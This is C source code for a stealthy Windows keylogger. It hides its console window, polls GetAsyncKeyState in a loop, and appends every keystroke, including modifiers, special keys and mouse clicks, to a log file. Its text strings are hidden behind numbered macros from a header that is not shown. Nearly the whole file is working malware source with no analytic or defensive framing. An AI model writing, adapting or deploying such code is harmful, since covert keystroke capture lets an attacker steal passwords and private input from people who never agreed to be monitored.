#include "peylib.h"

//Prototypes
unsigned char hide_console(void);
unsigned char init_log(void);
unsigned char get_altCtrlShift(unsigned char keyboardState[256]);
unsigned char get_capslock_state(void);
unsigned char log_keys(unsigned char *caps);
unsigned char log_alphabetic_keystates(unsigned char *caps, unsigned char altCtrlShift);
unsigned char log_numeric_keystates(unsigned char altCtrlShift);
unsigned char log_numPad_keystates(unsigned char altCtrlShift);
unsigned char log_function_keystates(unsigned char altCtrlShift);
unsigned char log_symbolic_keystates(unsigned char altCtrlShift);
unsigned char log_special_keystates(unsigned char *caps, unsigned char altCtrlShift);
unsigned char log_directional_keystates(unsigned char altCtrlShift);
unsigned char log_useless_keystates(unsigned char *caps, unsigned char altCtrlShift);
unsigned char log_character(char *str, unsigned char altCtrlShift);

//MAIN
int main(void) {
    
    hide_console();
    init_log();
    
    unsigned char caps = get_capslock_state();
    
    if(caps)
        log_character(key1, 0);
    else
        log_character(key2, 0);
   
    while(true){
        // Make this reflect the response timing of normal applications       
        Sleep(SLEEP_TIME);
        log_keys(&caps); 
    }  
}

unsigned char hide_console(void){
    
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
    
    return true;
}

unsigned char init_log(void){
    
    FILE *fp = fopen(FileName,"a+");
    if(fp == NULL) return false;  
    
    time_t theTime = time(0);
    
    // Write log header
    fprintf(fp, key23);
    fprintf(fp,  ctime(&theTime));
    fprintf(fp, key24);
    fclose(fp);
    
    return true;
}

unsigned char get_capslock_state(void){
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

unsigned char get_altCtrlShift(unsigned char keyboardState[256]){
    
    unsigned char altCtrlShift = 0;
    
    if((keyboardState[VK_SHIFT] & 0x80) == 0x80) // Shift Key
        altCtrlShift |= 0x01;
    
    if((keyboardState[VK_CONTROL] & 0x80) == 0x80) // Control Key
        altCtrlShift |= 0x02;
    
    if((keyboardState[VK_MENU] & 0x80) == 0x80) // Alt Key
        altCtrlShift |= 0x04;
    
    return altCtrlShift; 
}

unsigned char log_keys(unsigned char *caps) {    
    
    int i;
    unsigned char keyboardState[256];
    
    GetKeyboardState(keyboardState);
      
    // Get the states of Alt, Ctrl, & Shift
    unsigned char altCtrlShift = get_altCtrlShift(keyboardState);
    
    log_alphabetic_keystates(caps, altCtrlShift);
    log_numeric_keystates(altCtrlShift);
    log_function_keystates(altCtrlShift);
    log_symbolic_keystates(altCtrlShift);
    log_directional_keystates(altCtrlShift);
    log_special_keystates(caps, altCtrlShift);
    log_useless_keystates(caps, altCtrlShift);
    
}

unsigned char log_alphabetic_keystates(unsigned char *caps, unsigned char altCtrlShift){
    
    unsigned char character;
    
    // Virtual-Key Code range for alphabetic characters
    for(character=0x41; character<=0x5A; character++){
        // If the character is being pressed
        if(GetAsyncKeyState(character) == -32767) {
            
            // Check if it needs to be lower cased
            if(!((*caps == 1) ^ (altCtrlShift == 1)))
                character+=32;
            
            unsigned char reallySmallString[2] = {character, '\0'};
            log_character(reallySmallString, altCtrlShift);
            
        }
    }
}

unsigned char log_numeric_keystates(unsigned char altCtrlShift){
    
    unsigned char character;
    
    // Virtual-Key Code range for numeric characters
    for(character=0x30; character<=0x39; character++){
        // If the character is being pressed
        if(GetAsyncKeyState(character) == -32767) {
            
            // Check if shift was also being pressed
            if(altCtrlShift == 1){
                switch(character) {
                        case 0x30:
                             log_character(")", altCtrlShift);
                             break;
                        case 0x31:
                             log_character("!", altCtrlShift);
                             break;
                        case 0x32:
                             log_character("@", altCtrlShift);
                             break;
                        case 0x33:
                             log_character("#", altCtrlShift);
                             break;
                        case 0x34:
                             log_character("$", altCtrlShift);
                             break;
                        case 0x35:
                             log_character("%", altCtrlShift);
                             break;
                        case 0x36:
                             log_character("^", altCtrlShift);
                             break;
                        case 0x37:
                             log_character("&", altCtrlShift);
                             break;
                        case 0x38:
                             log_character("*", altCtrlShift);
                             break;
                        case 0x39:
                             log_character("(", altCtrlShift);
                             break;
                } // End Switch statement
            } // End If [shift pressed] statement
            else {
                unsigned char reallySmallString[2] = {character, '\0'};
                log_character(reallySmallString, altCtrlShift);
            }
        }// End if [character was being pressed] statement
    }// End for [each character] loop
}


unsigned char log_numPad_keystates(unsigned char altCtrlShift){
    
    unsigned char character;
    char reallySmallString[2] = {'\0', '\0'};
    
    // Virtual-Key Code range for numpad characters
    for(character=0x60; character<=0x6F; character++){
        // If the character is being pressed
        if(GetAsyncKeyState(character) == -32767){           
            
            if(character < 0x6A) // NumPad Numbers
                reallySmallString[0] = character - 0x30;
            else // NumPad Symbols *+,-./
                reallySmallString[0] = character - 0x40;
            
            log_character(reallySmallString, altCtrlShift);
        }
    }
}


unsigned char log_function_keystates(unsigned char altCtrlShift){
    
    unsigned char character;
    char reallySmallString[5] = {'[', 'F', ' ', ']', '\0'};
    // Virtual-Key Code range for function key characters
    for(character=0x70; character<=0x7B; character++){
        // If the character is being pressed
        if(GetAsyncKeyState(character) == -32767){
            reallySmallString[2] = character - 0x3F;
            if(reallySmallString[2] < 0x3A)
                log_character(reallySmallString, altCtrlShift);
            else {
                char slightlyBiggerString[6] = {'[', 'F','1', ' ', ']', '\0'};
                slightlyBiggerString[3] = character - 0x49;
                log_character(slightlyBiggerString, altCtrlShift);
            }
        }
    }
}


unsigned char log_symbolic_keystates(unsigned char altCtrlShift){
    
    if(GetAsyncKeyState(VK_OEM_1) == -32767) {
        if(altCtrlShift == 1) log_character(":", altCtrlShift);
        else log_character(";", altCtrlShift);
    }
    if(GetAsyncKeyState(0xBB) == -32767) {
        if(altCtrlShift == 1) log_character("+", altCtrlShift);
        else log_character("=", altCtrlShift);
    }
    if(GetAsyncKeyState(0xBC) == -32767) {
        if(altCtrlShift == 1) log_character("<", altCtrlShift);
        else log_character(",", altCtrlShift);
    }
    if(GetAsyncKeyState(0xBD) == -32767) {
        if(altCtrlShift == 1) log_character("_", altCtrlShift);
        else log_character("-", altCtrlShift);
    }
    if(GetAsyncKeyState(0xBE) == -32767) {
        if(altCtrlShift == 1) log_character(">", altCtrlShift);
        else log_character(".", altCtrlShift);
    }
    if(GetAsyncKeyState(VK_OEM_2) == -32767) {
        if(altCtrlShift == 1) log_character("?", altCtrlShift);
        else log_character("/", altCtrlShift);
    }
    if(GetAsyncKeyState(VK_OEM_3) == -32767) {
        if(altCtrlShift == 1) log_character("~", altCtrlShift);
        else log_character("`", altCtrlShift);
    }
    if(GetAsyncKeyState(VK_OEM_4) == -32767) {
        if(altCtrlShift == 1) log_character("{", altCtrlShift);
        else log_character("[", altCtrlShift);
    }
    if(GetAsyncKeyState(VK_OEM_5) == -32767) {
        if(altCtrlShift == 1) log_character("|", altCtrlShift);
        else log_character("\\", altCtrlShift);
    }
    if(GetAsyncKeyState(VK_OEM_6) == -32767) {
        if(altCtrlShift == 1) log_character("}", altCtrlShift);
        else log_character( "]", altCtrlShift);
    }
    if(GetAsyncKeyState(VK_OEM_7) == -32767) {
        if(altCtrlShift == 1) log_character("\"", altCtrlShift);
        else log_character("'", altCtrlShift);
    }
}

unsigned char log_directional_keystates(unsigned char altCtrlShift){
    
    if(GetAsyncKeyState(VK_LEFT) == -32767)
        log_character(key3, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_UP) == -32767) 
        log_character(key4, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_RIGHT) == -32767)
        log_character(key5, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_DOWN) == -32767)
        log_character(key6, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_PRIOR) == -32767)
        log_character(key7, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_NEXT) == -32767)
        log_character(key8, altCtrlShift | 0x08);
}


unsigned char log_special_keystates(unsigned char *caps, unsigned char altCtrlShift){
 
    if(GetAsyncKeyState(VK_SPACE) == -32767)
        log_character(" ", altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_BACK) == -32767) 
        log_character(key9, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_DELETE) == -32767)
        log_character(key10, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_RETURN) == -32767)
        log_character(key11, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_SNAPSHOT) == -32767)
        log_character(key12, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_TAB) == -32767)
        log_character(key13, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_ESCAPE) == -32767)
        log_character(key14, altCtrlShift | 0x08);
    
    if(get_capslock_state() != *caps){
        if(get_capslock_state() == 1)
            log_character(key1, altCtrlShift | 0x08);
        else log_character(key2, altCtrlShift | 0x08);
        *caps = get_capslock_state();
    }
    
    if(GetAsyncKeyState(VK_LBUTTON) == -32767)
        log_character(key15, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_RBUTTON) == -32767)
        log_character(key16, altCtrlShift | 0x08);
    
}

unsigned char log_useless_keystates(unsigned char *caps, unsigned char altCtrlShift){
    
    if(GetAsyncKeyState(VK_HOME) == -32767)
        log_character(key17, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_END) == -32767)
        log_character(key18, altCtrlShift | 0x08);
    if(GetAsyncKeyState(VK_INSERT) == -32767)
        log_character(key19, altCtrlShift | 0x08);
}

unsigned char log_character(char *str, unsigned char altCtrlShift){

    int numBrackets = 0;
    int i;
    
    FILE *fp = fopen(FileName,"a+");
    if(fp == NULL) return false;
    
    if((altCtrlShift & 2) == 2){
        fprintf(fp, key20);
        numBrackets++;
    }
    if((altCtrlShift & 4) == 4){
        fprintf(fp, key21);
        numBrackets++;
    }
    if(((altCtrlShift & 1) == 1 && numBrackets != 0) || ((altCtrlShift & 8) == 8 && (altCtrlShift & 1) == 1)){ 
        fprintf(fp, key22);
        numBrackets++;
    }
    
    if(str[0] != '[' && numBrackets != 0)
        fprintf(fp, "'");
    else if ( strcmp(str, key1) == 0 && numBrackets == 0)
        fprintf(fp, "\n");
    else if ( strcmp(str, key2) == 0 && numBrackets == 0)
        fprintf(fp, "\n");
    
    // Print the actual string
    fprintf(fp, str);
    
    if(str[0] != '[' && numBrackets != 0)
        fprintf(fp, "'");
    else if ( strcmp(str, key11) == 0 && numBrackets == 0)
        fprintf(fp, "\n");
    
    for(i=0; i<numBrackets; i++)
        fprintf(fp, "]");
    
    if(numBrackets!=0)
        fprintf(fp, "\n");
    
    fclose(fp);
}

